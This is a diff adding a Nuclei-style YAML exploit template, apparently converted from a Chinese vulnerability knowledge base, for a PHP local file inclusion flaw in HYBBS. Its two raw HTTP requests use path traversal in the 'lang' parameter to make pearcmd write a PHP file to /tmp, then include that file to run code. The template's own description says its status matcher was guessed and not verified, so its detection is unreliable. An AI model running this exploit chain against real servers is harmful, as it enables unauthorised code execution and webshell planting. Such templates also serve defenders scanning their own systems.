@@ -1,0 +1,87 @@
+id: poc-tklcs8pbzgcqzuev
+info:
+  name: HYBBS表白墙版存在PHP多语言文件包含漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/tklcs8pbzgcqzuev
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: lfi,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: tklcs8pbzgcqzuev
+http:
+- raw:
+  - 'GET /?user/login.html?lang=../../../../../../../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?=phpinfo()?>+/tmp/1.php HTTP/1.1
+
+    Host: {{Hostname}}
+
+    sec-ch-ua:
+
+    sec-ch-ua-mobile: ?0
+
+    sec-ch-ua-platform: ""
+
+    Upgrade-Insecure-Requests: 1
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.102 Safari/537.36
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+    Sec-Fetch-Site: none
+
+    Sec-Fetch-Mode: navigate
+
+    Sec-Fetch-User: ?1
+
+    Sec-Fetch-Dest: document
+
+    Accept-Encoding: gzip, deflate
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+    Cookie: csrftoken=cnYCJIhKhSIfQA1eThVuVaL7rUvCkbFmyQfHPcMTEc05ucYGXE1LBbr8zjMuIEXg; HYBBS_HEX=9jxJzkt%252BlNTYdhOMyOzp75CenkhTnVLDqF8Q7KZo3wGkuaF6PO8Y%25252FbGcbhoTwx4sKrZeysVDCy1B%25252FLCrPA4ukzQe8qGwhrtn3m5anDJtr5zw5ePE7WUV%252B22MrGP4qCKbTRqNS3PfEII%253D; PHPSESSID=21abd001de1878a8ab86f444ea95aba9; XDEBUG_SESSION=PHPSTORM%22; hyphp_lang=flag
+
+    Connection: close'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'GET /?user/login.html?lang=../../../../../../../../../../../../../../tmp/1 HTTP/1.1
+
+    Host: {{Hostname}}
+
+    sec-ch-ua:
+
+    sec-ch-ua-mobile: ?0
+
+    sec-ch-ua-platform: ""
+
+    Upgrade-Insecure-Requests: 1
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.102 Safari/537.36
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+    Sec-Fetch-Site: none
+
+    Sec-Fetch-Mode: navigate
+
+    Sec-Fetch-User: ?1
+
+    Sec-Fetch-Dest: document
+
+    Accept-Encoding: gzip, deflate
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+    Cookie: csrftoken=cnYCJIhKhSIfQA1eThVuVaL7rUvCkbFmyQfHPcMTEc05ucYGXE1LBbr8zjMuIEXg; HYBBS_HEX=9jxJzkt%252BlNTYdhOMyOzp75CenkhTnVLDqF8Q7KZo3wGkuaF6PO8Y%25252FbGcbhoTwx4sKrZeysVDCy1B%25252FLCrPA4ukzQe8qGwhrtn3m5anDJtr5zw5ePE7WUV%252B22MrGP4qCKbTRqNS3PfEII%253D; PHPSESSID=21abd001de1878a8ab86f444ea95aba9; XDEBUG_SESSION=PHPSTORM%22; hyphp_lang=flag
+
+    Connection: close'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
